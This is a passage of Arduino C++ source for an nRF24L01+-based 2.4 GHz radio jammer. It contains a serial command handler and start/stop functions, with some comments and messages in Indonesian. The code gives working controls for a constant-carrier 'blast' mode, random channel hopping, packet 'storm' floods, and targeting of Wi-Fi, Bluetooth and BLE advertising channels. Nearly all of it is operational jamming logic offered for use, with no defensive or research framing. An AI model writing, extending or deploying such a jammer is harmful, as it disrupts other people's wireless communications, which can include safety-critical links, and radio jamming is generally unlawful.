        Serial.println("RANDOM HOPPING ON");
    }
    else if (cmd == "randhop off") {
        randomHop = false;
        Serial.println("RANDOM HOPPING OFF (linear sweep)");
    }
    else if (cmd == "blast on") {
        blastMode = true;
        Serial.println("BLAST MODE ON (carrir unstopable on " + String(currentChannel) + ")");
        if (jamming) {
            radio.startConstCarrier(powerLevel, currentChannel);
        }
    }
    else if (cmd == "blast off") {
        blastMode = false;
        Serial.println("BLAST MODE OFF");
        if (jamming) {
            radio.stopConstCarrier();
        }
    }
    else if (cmd == "kill") {
        stopJamming();
        radio.stopConstCarrier();
        radio.powerDown();
        Serial.println("Radio is killed. type 'start' to reinitialize.");
    }
    else if (cmd.startsWith("hopdwell ")) {
        unsigned long d = cmd.substring(9).toInt();
        if (d >= MIN_DWELL_US && d <= MAX_DWELL_US) {
            hopDwell = d;
            Serial.println("Dwell: " + String(hopDwell) + " µs");
        } else {
            Serial.println("Dwell range: 1-1000 µs");
        }
    }
    else if (cmd.startsWith("hoprange ")) {
        String rest = cmd.substring(9);
        rest.trim();
        int sp = rest.indexOf(' ');
        if (sp > 0) {
            int lo = rest.substring(0, sp).toInt();
            int hi = rest.substring(sp + 1).toInt();
            if (lo >= MIN_CHANNEL && hi <= MAX_CHANNEL && lo <= hi) {
                hopMin = lo; hopMax = hi;
                Serial.println("Range hopping: " + String(hopMin) + "-" + String(hopMax));
            } else {
                Serial.println("Range is invalid! Must be within 0-125 and min <= max.");
            }
        } else {
            Serial.println("Format: hoprange <min> <max>");
        }
    }
    else if (cmd.startsWith("band ")) {
        String b = cmd.substring(5);
        b.trim();
        b.toLowerCase();
        if (b == "wifi") {
            targetBand = "WIFI";
            hopMin = WIFI_MIN_CH; hopMax = WIFI_MAX_CH;
            currentChannel = (WIFI_MIN_CH + WIFI_MAX_CH) / 2;
            Serial.println("Target band: WIFI (ch " + String(hopMin) + "-" + String(hopMax) + " = 2401-2473 MHz)");
        }
        else if (b == "bt" || b == "bluetooth") {
            targetBand = "BT";
            hopMin = BT_MIN_CH; hopMax = BT_MAX_CH;
            currentChannel = (BT_MIN_CH + BT_MAX_CH) / 2;
            Serial.println("Target band: BLUETOOTH (ch " + String(hopMin) + "-" + String(hopMax) + " = 2402-2480 MHz)");
        }
        else if (b == "bleadv") {
            targetBand = "BLE-ADV";
            hopMin = BT_MIN_CH; hopMax = BT_MAX_CH;
            currentChannel = bleAdvCh[0];
            randomHop = true;   // pastikan random hopping on
            Serial.println("Target: BLE ADVERTISING (ch 2 / 26 / 80 = 2402 / 2426 / 2480 MHz)");
        }
        else if (b == "all" || b == "full") {
            targetBand = "ALL";
            hopMin = MIN_CHANNEL; hopMax = MAX_CHANNEL;
            currentChannel = (MIN_CHANNEL + MAX_CHANNEL) / 2;
            Serial.println("Target band: ALL (ch " + String(hopMin) + "-" + String(hopMax) + ")");
        }
        else {
            Serial.println("Band not recognized! Use: wifi, bluetooth(bt), bleadv, all");
            return;
        }
        // Nonaktifkan blast agar hopping bisa menyapu band tsb
        blastMode = false;
        if (jamming) {
            setChannel(currentChannel);
        }
    }
    else if (cmd == "status") {
        Serial.println("=== STATUS ===");
        Serial.println("nRF24L01+ : " + String(radio.isChipConnected() ? "✅ CONNECTED" : "❌ NOT DETECTED"));
        Serial.println("Jamming   : " + String(jamming ? "ACTIVE" : "STOPPED"));
        Serial.println("Channel   : " + String(currentChannel));
        Serial.println("Power     : " + powerStr);
        Serial.println("Rate      : " + rateStr);
        Serial.println("Mode      : " + String(aggressiveMode ? "AGGRESSIVE" : "NORMAL"));
        Serial.println("Turbo     : " + String(turboMode ? "ON" : "OFF"));
        Serial.println("Storm     : " + String(stormMode ? "ON" : "OFF"));
        Serial.println("RandomHop : " + String(randomHop ? "ON" : "OFF (linear)"));
        Serial.println("Blast     : " + String(blastMode ? "ON" : "OFF"));
        Serial.println("HopDwell  : " + String(hopDwell) + " µs");
        Serial.println("HopRange  : " + String(hopMin) + "-" + String(hopMax));
        Serial.println("TargetBand: " + targetBand);
        Serial.println("=== END STATUS ===");
    }
    else if (cmd == "help" || cmd == "bantuan") {
        Serial.println("=== COMMAND LIST (AGGRESSIVE) ===");
        Serial.println("start / stop          - Start / stop jamming");
        Serial.println("channel <num>         - Set channel (0-125)");
        Serial.println("power <MAX/HIGH/LOW/MIN>");
        Serial.println("rate <250KBPS/1MBPS/2MBPS>");
        Serial.println("aggressive on/off     - Set aggressive mode (dwell minimal)");
        Serial.println("turbo on/off          - Dwell = 1 µs (override aggressive)");
        Serial.println("storm on/off          - Send random packets on each hop");
        Serial.println("randhop on/off        - Random hopping (default) atau linear sweep");
        Serial.println("blast on/off          - Carrier is on one channel (ignore hopping)");
        Serial.println("hopdwell <us>         - Dwell time (1-1000 µs)");
        Serial.println("hoprange <min> <max>  - Range hopping");
        Serial.println("band <wifi/bt/bleadv/all> - Specific band jamming (Wi-Fi, Bluetooth, BLE advertising, or all)");
        Serial.println("kill                  - Kill all transmissions and power down radio");
        Serial.println("status / help         - Info / help command list");
        Serial.println("=== END ===");
    }
    else {
        Serial.println("Unknown command. type 'help' for list of commands.");
    }
    needRedraw = true;
}

// ============================================
// FUNGSI START/STOP JAMMING
// ============================================
void startJamming() {
    if (jamming) {
        Serial.println("Jamming is running.");
        return;
    }
    // Pastikan radio aktif
    radio.powerUp();
    applyRadioConfig();
    jamming = true;
    Serial.println("Jamming is started with Aggressive Mode!");
    Serial.println("   Power: " + powerStr + ", Rate: " + rateStr);
    Serial.println("   HopRange: " + String(hopMin) + "-" + String(hopMax) + ", Dwell: " + String(hopDwell) + " µs");
    Serial.println("   RandomHop: " + String(randomHop ? "ON" : "OFF") + ", Storm: " + String(stormMode ? "ON" : "OFF"));
    if (blastMode) {
        Serial.println("   BLAST MODE aktif – carrier konstan di channel " + String(currentChannel));
    }
}

void stopJamming() {
    if (!jamming) {
        Serial.println("Jamming sudah berhenti.");
        return;
    }
    radio.stopConstCarrier();
    jamming = false;
    Serial.println("Jamming Stopped.");
}